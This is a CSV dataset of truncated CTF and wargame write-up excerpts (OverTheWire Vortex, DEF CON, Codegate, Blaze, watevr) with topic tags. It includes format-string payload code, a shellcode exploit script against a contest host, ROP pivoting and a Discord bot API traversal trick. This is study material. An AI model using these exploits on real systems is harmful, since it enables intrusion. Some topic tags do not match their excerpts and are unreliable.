dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,pwntools-write-ups-10,pwntools-write-ups,wargames/overthewire-vortex/level6/README.md,level6,command_injection,"# Vortex 6 Program re-executes itself if there are any environment variables. The definition of 'itself' is controlled via `argv[0]` which we control, and point at `/bin/sh`."
ctf_writeup,pwntools-write-ups-11,pwntools-write-ups,wargames/overthewire-vortex/level1/README.md,level1,format_string,"# Vortex 1 Simple buffer underflow. Decrement 'ptr' until it points at itself, overwrite the high byte. ```c int main ( ) { unsigned char buf[512]; unsigned char *ptr = buf + (sizeof(buf) / 2); unsigned int x; while ((x = getchar()) != EOF) { switch (x) { case '\n': print(buf, sizeof(buf)); continue; break; case '\\': ptr--; break; default: if (((unsigned int)ptr & 0xff000000) == 0xca000000) { setresuid(geteuid(), geteuid(), geteuid()); execlp(""/bin/sh"", ""sh"", ""-i"", NULL); } if (ptr > buf + sizeof(buf)) { continue; } ptr++[0] = x; break; } } printf(""All done\n""); } ```"
ctf_writeup,pwntools-write-ups-12,pwntools-write-ups,wargames/overthewire-vortex/level8/README.md,level8,buffer_overflow,"# Vortex 8 Turns out `setresuid` and company are thread-specific. This challenge exercises that. The unprivileged thread is vulnerable to a stack-buffer overflow. We leverage this to swap out the GOT entry for `_sleep` with a pointer to our shellcode, then call `_exit`. When the second thread attempts to sleep next, it executes the second stage. Yet again, this script uses hellman's excellent `r.sh` so that we can just script GDB to print out stack addresses for us and automate."
ctf_writeup,pwntools-write-ups-13,pwntools-write-ups,wargames/overthewire-vortex/level10/README.md,level10,command_injection,"# Vortex 10 This challenge requires pressing the F5 buttin in IDA pro, some brute forcing. The challenge gathers a bunch of timing information, feeds it to `srand()` and then `rand()`, and you need to predict a value. We use a helper C program with the logic lifted from Hex Rays to generate an approximation of the starting parameters, then duplicate the logic and search from Python. We load `libc` since I don't trust that Python's `rand`/`srand` are the same. Once we've found a match, we get a shell."
ctf_writeup,pwntools-write-ups-14,pwntools-write-ups,wargames/overthewire-vortex/level4/libformatstr/README.md,libformatstr,format_string,"libformatstr.py ==================== Small script to simplify format string exploitation. Usage --------------------- * Case 1 - replace one dword: ```python import sys from libformatstr import FormatStr addr = 0x08049580 system_addr = 0x080489a3 p = FormatStr() p[addr] = system_addr # buf is 14th argument, 4 bytes are already printed sys.stdout.write( p.payload(14, start_len=4) ) ``` * Case 2 - put ROP code somewhere: ```python import sys from libformatstr import FormatStr addr = 0x08049580 rop = [0x080487af, 0x0804873c, 0x080488de] p = FormatStr() p[addr] = rop sys.stdout.write( p.payload(14) ) ``` * Case 3 - guess argument number and padding: ```python import sys from libformatstr import FormatStr # let's say we have do_fmt function, # which gives us only output of format string # (you can also just copy fmtstr and output manually) buf_size = 250 # fix buf_size to avoid offset variation res = do_fmt(make_pattern(buf_size)) argnum, padding = guess_argnum(res, buf_size) # of course you can use it in payload generation p = FormatStr(buf_size) p[0xbffffe70] = ""\x70\xfe\xff\xbf\xeb\xfe"" # yes, you can also put strings sys.stdout.write( p.payload(argnum, padding, 3) ) # we know 3 byte"
ctf_writeup,pwntools-write-ups-15,pwntools-write-ups,2014/defcon-finals/wdub-v1/README.md,wdub-v1,command_injection,"# wdub wdub1 is static compiled ARMv7 binary. For some reason, IDA won't disassemble the binary correctly. We have to manually override the CPU architecture setting to ARMv7-M, then again, manually disassemble the instruction in Thumb mode with IDA's `MakeCode` functionality. ![](images/image10.png) The real main routine is at 0x9210 ![](images/image07.png) Strace tells us that wdub1 sets ALARM timer, also it can't be run from terminal (Socket operation on non-socket). ![](images/image11.png) So what we need to do in order to debug this binary is: 1. Disable alarm 2. Redirect I/O to socket. But the binary is static compiled and stripped. so it is difficult to disable alarm by patching. so we use signal masking to disable SIGALRM. ```c #include <stdio.h> #include <signal.h> int main(){ sigset_t signal_set; sigaddset(&signal_set, SIGALRM); sigprocmask(SIG_BLOCK, &signal_set, NULL); char* args[] = {""./wdub"", 0}; execve(args[0], args, 0); return 0; } ``` After disable the alarm and redirect the I/O with xinet.d, we can run the binary and debug it. ![](images/image03.png) At 0xc3b2 ~ 0xc3c2 the HTTP request object (12byte) is created. ![](images/image14.png) HTTP request object is consi"
ctf_writeup,pwntools-write-ups-16,pwntools-write-ups,2014/defcon-finals/eliza-x86-printf/README.md,eliza-x86-printf,buffer_overflow,"# Eliza This is the x86 version of the challenge. There are two vulnerabilities leveraged in this exploit. First, there's uninitialized stack data printed when doing the 'info' command. By calling 'help', you can pre-load that area with a pointer into the loaded module. ASLR is now defeated. Second, there's a buffer overflow in the implementation of `my_printf`. However, your buffer is effectively terminated by newlines or `NUL`s. In order to get around this, we need to pivot. The pivot is performed by loading a pointer to the `.data` area into `eax` (by means of `pop ecx` then `mov eax, ecx` gadgets). Afterward, we go into the `get_command_line` routine, which reads the second stage into the `.data` area with a known base address. Finally, we open the flag file and read it. Because the binary is RELRO (or some other reason, perhaps) we have to load `ebx` with the address of the `.got.plt` area before making calls. ## Caveats Because of file descriptor inheriting, the exploit may not work on your system unless you change the file descriptor for the `read` call. `5` works in `python`, `3` works in iPython. Additionally, this relies on pwntools auto-generation of some ROP stubs. Beca"
ctf_writeup,pwntools-write-ups-17,pwntools-write-ups,2013/codegate-quals/vuln100/README.md,vuln100,buffer_overflow,"# Codegate 2013 Vuln 100 Writeup ## Initial Investigation Simple forking server listens on port 6666. $ checksec.sh --file ./94dd6790cbf7ebfc5b28cc289c480e5e RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH ./94dd6790cbf7ebfc5b28cc289c480e5e After answering some trivia, it asks for your name. $ nc localhost 6666 Welcome to CODEGATE2013. This is quiz game. Solve the quiz. It is Foot Ball Club. This Club is an English Primier league football club. This Club founded 1886. This club Manager Arsene Wenger. This club Stadium is Emirates Stadium. What is this club? (only small letter) arsenal good!1 It is a royal palace locate in northern Seoul, South Korea. First constructed in 1395, laster burned and abandoned for almost three centuries, and then reconstructed in 1867, it was the main and largest place of the Five Grand Palaces built by the joseon Dynasty. What is it?(only small letter) gyeongbokgung good!2 He is South Korean singer, songwriter, rapper, dancer and record producer. He is known domestically for his humorous videos and stage performances, and internationally for his hit single Gangnam Style. Who is he?(only s"
ctf_writeup,pwntools-write-ups-18,pwntools-write-ups,2013/codegate-quals/vuln200/README.md,vuln200,buffer_overflow,"# Codegate 2013 Vuln 200 Writeup ## Initial Analysis It's a 32-bit binary with no mitigations. $ file ./94dd6790cbf7ebfc5b28cc289c480e5e ./94dd6790cbf7ebfc5b28cc289c480e5e: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xce5456409e1bfe207cd58c5b77ce99125d3b8d0f, stripped $ checksec.sh --file 94dd6790cbf7ebfc5b28cc289c480e5e RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 94dd6790cbf7ebfc5b28cc289c480e5e Unfortunately, it doesn't appear to start out of the box: $ ./5b7420a5bcdc1da85bccc62dcea4c7b8 [2] + 11123 segmentation fault ./5b7420a5bcdc1da85bccc62dcea4c7b8 So let's dive into the disassembly. ## Disassembly & Reversing Right off the bat, we see that there's a simple ptrace anti-debugging check. This doesn't actually do anything. Ignore it. .text:08048ABE E8 AD FC FF FF call _ptrace .text:08048AC3 85 C0 test eax, eax .text:08048AC5 79 0C jns short loc_8048AD3 .text:08048AC7 C7 04 24 E6 9A+ mov dword ptr [esp], offset s ; ""Debugger Detected!!!"" .text:08048ACE E8 DD FD FF FF call _puts .text:08048AD3 After creating a listener socket, t"
ctf_writeup,pwntools-write-ups-19,pwntools-write-ups,2013/codegate-quals/vuln300/README.md,vuln300,buffer_overflow,"# Codegate 2013 Vuln 300 Writeup ## Initial Analysis The binary accepts data over stdin/stdout, and spits back at you a bunch of printable characters, appended with a number of your choosing. $ checksec.sh --file 8ff953dd97c4405234a04291dee39e0b RELRO STACK CANARY NX PIE RPATH RUNPATH FILE No RELRO No canary found NX disabled No PIE No RPATH No RUNPATH 8ff953dd97c4405234a04291dee39e0b $ file 8ff953dd97c4405234a04291dee39e0b 8ff953dd97c4405234a04291dee39e0b: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, BuildID[sha1]=0xe2aac24b3214869f3b7173a83dac8115ae4cd8ba, stripped Example output ./8ff953dd97c4405234a04291dee39e0b Input Num : 10 Input Msg : 10 Reply : ABCDEFGHIJ10 The immediate thing I'd think with this problem is to provide just-too-large values, and overwrite something with the data that's appended. Let's see if we can stick binary data on the end. python <<EOF | ./8ff953dd97c4405234a04291dee39e0b | xxd print 10 print '\xfb\n\x00' EOF 0000000: 496e 7075 7420 4e75 6d20 3a20 496e 7075 Input Num : Inpu 0000010: 7420 4d73 6720 3a20 5265 706c 7920 3a20 t Msg : Reply : 0000020: 0a41 4243 4445 4647 4849 4afb 0a0"
ctf_writeup,pwntools-write-ups-20,pwntools-write-ups,2013/codegate-quals/vuln400/README.md,vuln400,command_injection,"# Codegate 2013 Vuln 400 Writeup ## Initial Investigation Cool, we're actually getting to something with mitigations! checksec.sh --file 7b80d4d56c282a310297336752c589b7 RELRO STACK CANARY NX PIE RPATH RUNPATH FILE Partial RELRO Canary found NX enabled No PIE No RPATH No RUNPATH 7b80d4d56c282a310297336752c589b7 7b80d4d56c282a310297336752c589b7: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xff0014df6d9c8b3dfb72355bc23d76e370ac5687, stripped Let's see what it does... _______________________________ /==============================/ | Onetime Board Console | /------------------------------/ | | WELCOME | | |__________|_________|_________| | W a i t | ++++++++++++++++++++++++++++++++ And then we do wait. For thirty seconds. .text:08048A7B mov dword ptr [esp], 1Eh ; seconds .text:08048A82 call _sleep Let's get rid of that. Probably for throttling purposes during the CTF. python -c 'print ""\x90""*100' > nops dd conv=notrunc if=nops of=7b80d4d56c282a310297336752c589b7 seek=$((0xa82)) bs=1 count=5 Cool, what can we do? Looks like we can create/edit/delete/view replies with three fields. And then we can l"
ctf_writeup,pwntools-write-ups-21,pwntools-write-ups,2014/plaid/whee/writeup.txt,whee,other,"== WHEEE *UPDATE*: I was contacted Apocalyptic from w3stormz regarding an improvement to the attack. Scroll to the bottom for optimizations and benchmarks. In this challenge we will carry out a chosen plaintext attack on a block cipher in order to recover the round keys. We are given some python code which implement an encryption algorithm used by an online service. When connecting to the service we are asked for a typical SHA1 based proof-of-work. After submitting that we can send a (hex-encoded) string to encrypt, and after some time (the encryption algorithm is extremely slow to prevent offline brute force attacks) we get back the encrypted string (again hex-encoded). So let's look at the encryption algorithm; It is a block cipher running in ECB mode. Each block is 24 bits and is big-endian encoded. At a first glance the block cipher looks like a Feistel network with 2^24 rounds. Because of a (intentional?) typo it is not a Feistel network, but it is educational to analyse it as such, so for now let's ignore the typo. Because of a very weak key scheduling this cipher can be attacked. In the following we will denote the secret key to be uncovered by KEY, not to be confused with k"
ctf_writeup,writeups-0,writeups,README.md,writeups,other,"# writeups Writeups for CTFs by the team [ByteBandits](https://ctftime.org/team/13691) All writeups are organized in the pattern: ctf-name > problem-type > problem-name > author That is, very similar to that of the repo [writeups](https://github.com/ctfs/write-ups-2015) The repository also includes a small [search tool](search.py), through we can we can easily find writeups based on several conditions. Currently it just provides limited functionality and a crude command line interface."
ctf_writeup,writeups-1,writeups,hackvent-2015/README.md,hackvent-2015,format_string,# Hackvent 2015 ## by sudhackar This subdirectory contains some scripts I wrote for a particular day of the month for [hackvent 2015](http://hackvent.hacking-lab.com). Overall it was a great CTF. I ended up at #26 in 1000+ players. * 14 Dec : Simple .NET decompiling * 18 Dec : Mach-O 64-bit x86_64 executable * 19 Dec : Simple [SOAP](https://en.wikipedia.org/wiki/SOAP) * 23 Dec : Format String Exploitation
ctf_writeup,writeups-2,writeups,ectf-teaser-2015/reverse/BestShell/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ectf-teaser-2015) [](type=reverse) [](tags=gdb,golang) [](tools=gdb) [](techniques=breakpoints) So what we have here is a [zip](../BestShell_d3bed024e5edcddeadade8a638247f5e.zip) file. On extracting it we get a single executable. ```bash $ file bestshell bestshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=8b4c45947ca2795d92a94c560d91183710b4fea2, not stripped ``` A little bit of analysis shows us it was written in [Golang](https://github.com/golang). So I had to install Go as I had never used it before. Its brief output!! ```bash $ ./bestshell _ _ _ _ _ | |__ ___ ___| |_ ___| |__ ___| | | | '_ \ / _ \/ __| __/ __| '_ \ / _ \ | | | |_) | __/\__ \ |_\__ \ | | | __/ | | |_.__/ \___||___/\__|___/_| |_|\___|_|_| Available commands: 5azWRE, Ax7lIl, 312TUo, UgZInz >> 5azWRE total 84 -rwxr-x--x 1 sudhakar sudhakar 36632 Oct 8 21:46 bestshell -rw-r--r-- 1 sudhakar sudhakar 38191 Oct 10 10:22 bestshell.c -rw-r--r-- 1 sudhakar sudhakar 59 Oct 10 14:36 peda-session-bestshell.txt -rw-r--r-- 1 sudhakar sudhakar 1 Oct 10 12:56 peda-session-ls.txt >> Ax7lIl Tue Oct 13 19:16:55 IST 20"
ctf_writeup,writeups-3,writeups,watevr-2019/rev/repyc/vn-ki/README.md,vn-ki,command_injection,"# Repyc #### Category: Rev #### Points: 147 This was a python bytecode reversing challenge. We are given a python 3.6 bytecode compiled [file](./decomp.py). Once decompiled we get a python file with variables as unicode characters. ```python 佤 = 0 侰 = ~佤 * ~佤 俴 = 侰 + 侰 def 䯂(䵦): 굴 = 佤 굿 = 佤 괠 = [佤] * 俴 ** (俴 * 俴) 궓 = [佤] * 100 괣 = [] while 䵦[굴][佤] != '듃': 굸 = 䵦[굴][佤].lower() 亀 = 䵦[굴][侰:] if 굸 == '뉃': 괠[亀[佤]] = 괠[亀[侰]] + 괠[亀[俴]] elif 굸 == '렀': 괠[亀[佤]] = 괠[亀[侰]] ^ 괠[亀[俴]] elif 굸 == '렳': 괠[亀[佤]] = 괠[亀[侰]] - 괠[亀[俴]] elif 굸 == '냃': 괠[亀[佤]] = 괠[亀[侰]] * 괠[亀[俴]] elif 굸 == '뢯': 괠[亀[佤]] = 괠[亀[侰]] / 괠[亀[俴]] elif 굸 == '륇': 괠[亀[佤]] = 괠[亀[侰]] & 괠[亀[俴]] elif 굸 == '맳': 괠[亀[佤]] = 괠[亀[侰]] | 괠[亀[俴]] elif 굸 == '괡': 괠[亀[佤]] = 괠[亀[佤]] elif 굸 == '뫇': 괠[亀[佤]] = 괠[亀[侰]] ``` I thought this was some obfuscation technique and wasted some time looking for deobfuscators. Then I tried to rename the variables and try to make sense of the code. The function is later called with a list of lists. ```python ['꽺', 0, 0], ['꼖', 6, 'á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉ"
ctf_writeup,writeups-4,writeups,watevr-2019/rev/hacking-for-vodka/vn-ki/README.md,vn-ki,other,"# Hacking for vodka #### Category: rev #### Points: 56 This was a relatively easy chall as you can see with the points. The following is the decompiled check. ```c while (i < n) { local_4c = pass[i]; // input byte local_4b = 0; local_4a = (byte)i ^ *(byte *)(enc + i); // flag byte local_49 = 0; (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c1d; __n = strcmp(&local_4c,&local_4a,*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); if (__n != 0) { (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c2d; puts(""Sorry, incorrect password!"",*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); /* WARNING: Subroutine does not return */ (&uStack144)[uVar1 * 0x1ffffffffffffffe] = 0x555555554c37; exit(0,*(undefined *)(&uStack144 + uVar1 * 0x1ffffffffffffffe)); } i = i + 1; } ``` Our input is checked byte by byte with the flag. (Also there is a ptrace check at the start, and this can be patched out) There are two easy methods I discovered after getting the flag using my method: * Bruteforce ltrace the flag out, figuring out the flag byte by byte. * Patch the incorrect password jump and provide an incorrect flag, thus getting the whole flag. I spoke with the chall author and "
ctf_writeup,writeups-5,writeups,watevr-2019/rev/funcknt/vn-ki/README.md,vn-ki,other,"# fuckn't #### Category: rev #### Points: 111 We are given a js file full of brackets. This is obfuscated using jsfuck obfuscator. So we use jsunfuck to get unfucked output. ```js [][""f""+([!1]+[][[[].filter[""constructor""](""return(isNaN+false).constructor.fromCharCode(119,97,116,101,118,114,123,106,97,118,97,115,99,114,105,112,116,95,105,115,95,97,95,49,97,110,103,117,97,103,51,95,102,48,114,95,105,110,116,51,49,49,51,99,116,117,97,49,115,125)"")()]])[""10""]+""lter""][""constructor""](""return alert"")()([].filter[""constructor""](""return(isNaN+false).constructor.""+420302320151902[""toString""](""31"")[""split""](3)[""join""](""C"")+""de(""+""73false39false109false32false115false111false114false114false121false32false68false97false118false101false44false32false73false39false109false32false97false102false114false97false105false100false32false73false32false99false97false110false39false116false32false100false111false32false116false104false97false116""[""split""](!1)+ "")"")()); ``` Even the unfucked output is not very readable. But we can see there are some numbers in the output. These numbers look ascii. Let's take a look. ```js >String.fromCharCode(119,97,116,101,118,114,123,106,97,118,97,115,99,114,105,112,116"
ctf_writeup,writeups-6,writeups,watevr-2019/misc/axela/vn-ki/README.md,vn-ki,other,"# Axela #### Category: misc #### Points: 236 Axela was an easy misc discord bot challenge but not a lot of teams solved it. The challenge was to exploit a discord bot called Axela. ``` $ Axela help All commands: Axela ping - ping Axela say <phrase> - repeats the phrase Axela get guilds <guild_id> - gets info about a specific guild Axela get channels <channel_id> - gets info about a specific channel Axela get users <user_id> gets info about a specific user ``` An interesting discovery: ``` $ Axela get users !@ Unrecognized response format {""user_id"": [""Value \""!@\"" is not snowflake.""]} ``` This means Axela will leak values if the format is not what it expects. Also searching for snowflake leads us to the discord api. ``` $ Axela get users / I dont like that character. Please don't use that. ``` Oh. They're filtering `/`. Now we know the exploit. URLEncode it. ``` $ Axela get users %2f 404: Not Found ``` As expected. Using discord api documentation, let's get the servers Axela is a part of: ``` $ Axela get users @me%2fguilds [{""id"": ""601776233411510302"", ""name"": ""Super Secret Server"", ""icon"": ""baca37e4b8e17d0d59afde06f86b4659"", ""owner"": false, ""permissions"": 2146959351, ""features"": ["
ctf_writeup,writeups-7,writeups,blaze-ctf-2018/re/magic-re/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=re) [](tags=game) [](techniques=bruteforce) # magic-re (re-420) ``` One binary, two challenges - double the fun magic-re: Reverse me | magic-pwn: Pwn me Note: for magic-re, 4 flags can work, but only one makes sense and is the one to be submitted. Author : DuSu Solves : ~35 ``` This was an interesting chall, but due to a side channel it was easier to brute force this like the other RE chall. The input given was put into a code template and then executed byte by byte. The instructions allowed were ```python >>> from pwn import * >>> for i in xrange(0x40, 0x60): ... print i, disasm(chr(i)) ... 64 0: 40 inc eax 65 0: 41 inc ecx 66 0: 42 inc edx 67 0: 43 inc ebx 68 0: 44 inc esp 69 0: 45 inc ebp 70 0: 46 inc esi 71 0: 47 inc edi 72 0: 48 dec eax 73 0: 49 dec ecx 74 0: 4a dec edx 75 0: 4b dec ebx 76 0: 4c dec esp 77 0: 4d dec ebp 78 0: 4e dec esi 79 0: 4f dec edi 80 0: 50 push eax 81 0: 51 push ecx 82 0: 52 push edx 83 0: 53 push ebx 84 0: 54 push esp 85 0: 55 push ebp 86 0: 56 push esi 87 0: 57 push edi 88 0: 58 pop eax 89 0: 59 pop ecx 90 0: 5a pop edx 91 0: 5b pop ebx 92 0: 5c pop esp 93 0: 5d pop ebp 94 0: 5e pop esi 95 0: 5f pop edi ``` based on how we ma"
ctf_writeup,writeups-8,writeups,blaze-ctf-2018/re/smokemebaby/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=re) [](tags=game) [](techniques=bruteforce) # smokemebaby (re-420) ``` get this files solve at: smokeme.420blaze.in tcp 12345 author: vito solves: ~30 ``` This was a rust compiled binary. In main()->check(), there were 39 check_i functions to verify the i'th character based on some equations. If the check failed check_i() returned i as the exit code. This made it perfect for bruteforce. Iterate through your keyspace unless the exit code increases, repeat. driver script ```python import subprocess import string prev = [""A"" for i in xrange(42)] #flag = ""on anntada ona? Somebnefbbeafd roia me a"" flag = """" for i, j in enumerate(flag): prev[i] = j for i in xrange(len(flag),42): cnt = [] for j in string.lowercase+string.digits+string.uppercase+"" <>,.?/\""\':;{}[]\\~`!@#$%^&*()_+=-"": prev[i] = j open(""input"", ""w+"").write("""".join(prev)) d = subprocess.Popen(""gdb -q -x ./plz.py "", shell=True, stdout=subprocess.PIPE).stdout.read().strip() try: c = int(d.split("":::::"")[1]) # print c, except: c = -1 cnt.append((c,j)) print cnt best = sorted(cnt ,key=lambda x: x[0], reverse=True)[0] prev[i] = best[1] print """".join(prev) """""" echo -ne ""on anntada ona? Somebnefbbeafd roia"
ctf_writeup,writeups-9,writeups,blaze-ctf-2018/pwn/shellcodeme_hard/sudhackar/README.md,sudhackar,command_injection,"[](ctf=blaze-2018) [](type=exploit) [](tags=game) [](techniques=shellcode) # shellcodeme_hard (pwn-420) ``` nc shellcodeme.420blaze.in 4200 Author : aweinstock ``` Solving the easy version of this chall took me some time. However once that was done, I used the same technique to pwn this one. In this hard version the stack and registers were populated from /dev/urandom so that we don't have references to pivot through. This made me do the chall in 6 unique bytes. ```python from pwn import * context(arch='amd64', os='linux', log_level='info') payload = asm((""push 0x40000000; ""*0x100)+(""push rbx; ""*36)+""push 0x400000; pop rbx; ""+(""inc ebx; ""*0x86d)+""push rbx; ret;"") payload2 = asm(shellcraft.amd64.linux.sh()) s = remote(""shellcodeme.420blaze.in"", 4200) s.sendline(payload) s.sendline(payload2) s.interactive() s.close() ``` The random values from the context seldom had 0s. So I sprayed the stack with a register to make `seen` for every character > 0. Then using the technique from [here](../../shellcodeme/sudhackar/README.md) to gain code execution."
